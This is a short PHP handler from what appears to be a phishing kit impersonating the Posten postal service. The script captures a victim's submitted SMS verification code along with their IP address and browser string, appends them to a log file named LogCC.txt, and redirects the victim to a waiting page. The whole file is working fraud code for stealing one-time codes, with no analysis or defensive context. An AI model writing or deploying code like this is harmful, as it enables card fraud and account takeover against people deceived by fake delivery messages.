<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ Posten SMS]-----++--\n";
$message .= "SMS : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "--------------------------------------------\n";


    $text = fopen('../LogCC.txt', 'a');
fwrite($text, $message);



header("Location: ../wait2/");         
?>